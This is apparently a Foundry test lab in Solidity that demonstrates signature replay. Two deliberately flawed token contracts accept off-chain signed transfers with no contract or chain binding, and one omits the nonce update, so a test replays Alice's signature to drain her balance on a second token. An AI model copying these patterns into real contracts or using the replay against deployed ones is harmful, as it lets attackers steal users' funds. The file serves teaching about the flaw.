// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    ShipmenttokenWhale ShipmenttokenWhaleContract;
    SixEyeCargotoken SixEyeCargotokenContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        ShipmenttokenWhaleContract = new ShipmenttokenWhale();
        ShipmenttokenWhaleContract.InventorytokenWhaleDeploy(address(this));
        ShipmenttokenWhaleContract.moveGoods(alice, 1000);
        SixEyeCargotokenContract = new SixEyeCargotoken();
        SixEyeCargotokenContract.InventorytokenWhaleDeploy(address(this));
        SixEyeCargotokenContract.moveGoods(alice, 1000);
    }

    function testSignatureReplay() public {
        emit log_named_uint(
            "Balance",
            ShipmenttokenWhaleContract.stocklevelOf(address(this))
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                address(alice),
                address(bob),
                uint256(499),
                uint256(1),
                uint256(0)
            )
        );
        emit log_named_bytes32("hash", hash);

        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v
        //r - a point on the secp256k1 elliptic curve (32 bytes)
        //s - a point on the secp256k1 elliptic curve (32 bytes)
        //v - recovery id (1 byte)

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        emit log_named_uint("v", v);
        emit log_named_bytes32("r", r);
        emit log_named_bytes32("s", s);

        address alice_address = ecrecover(hash, v, r, s);
        emit log_named_address("alice_address", alice_address);
        emit log_string(
            "If operator got the Alice's signature, the operator can replay this signature on the others contracts with same method."
        );
        vm.startPrank(bob);

        ShipmenttokenWhaleContract.relocatecargoProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        // Bob successfully transferred funds from Alice.
        emit log_named_uint(
            "SET token balance of Bob",
            ShipmenttokenWhaleContract.stocklevelOf(address(bob))
        );

        // Because we have nonce protect to replay, so we can not replay again in the same contract.
        // BTW this nonce start from 0, it's not a best practice.
        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
        // emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));

        emit log_string(
            "Try to replay to another contract with same signature"
        );
        emit log_named_uint(
            "Before the replay, SIX token balance of bob:",
            SixEyeCargotokenContract.stocklevelOf(address(bob))
        );

        SixEyeCargotokenContract.relocatecargoProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the replay, SIX token balance of bob:",
            SixEyeCargotokenContract.stocklevelOf(address(bob))
        );

        SixEyeCargotokenContract.relocatecargoProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the second replay, SIX token balance of bob:",
            SixEyeCargotokenContract.stocklevelOf(address(bob))
        );
    }
}

contract ShipmenttokenWhale is Test {
    address player;

    uint256 public aggregateStock;
    mapping(address => uint256) public stocklevelOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function InventorytokenWhaleDeploy(address _player) public {
        player = _player;
        aggregateStock = 2000;
        stocklevelOf[player] = 2000;
    }

    function _shiftstock(address to, uint256 value) internal {
        stocklevelOf[msg.sender] -= value;
        stocklevelOf[to] += value;
    }

    function moveGoods(address to, uint256 value) public {
        require(stocklevelOf[msg.sender] >= value);
        require(stocklevelOf[to] + value >= stocklevelOf[to]);

        _shiftstock(to, value);
    }

    function relocatecargoProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce", nonce);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            stocklevelOf[_to] + _value < stocklevelOf[_to] ||
            stocklevelOf[msg.sender] + _feeUgt < stocklevelOf[msg.sender]
        ) revert();
        stocklevelOf[_to] += _value;

        stocklevelOf[msg.sender] += _feeUgt;

        stocklevelOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}

contract SixEyeCargotoken is Test {
    address player;

    uint256 public aggregateStock;
    mapping(address => uint256) public stocklevelOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function InventorytokenWhaleDeploy(address _player) public {
        player = _player;
        aggregateStock = 2000;
        stocklevelOf[player] = 2000;
    }

    function _shiftstock(address to, uint256 value) internal {
        stocklevelOf[msg.sender] -= value;
        stocklevelOf[to] += value;
    }

    function moveGoods(address to, uint256 value) public {
        require(stocklevelOf[msg.sender] >= value);
        require(stocklevelOf[to] + value >= stocklevelOf[to]);

        _shiftstock(to, value);
    }

    function relocatecargoProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            stocklevelOf[_to] + _value < stocklevelOf[_to] ||
            stocklevelOf[msg.sender] + _feeUgt < stocklevelOf[msg.sender]
        ) revert();
        stocklevelOf[_to] += _value;

        stocklevelOf[msg.sender] += _feeUgt;

        stocklevelOf[_from] -= _value + _feeUgt;
        return true;
    }
}
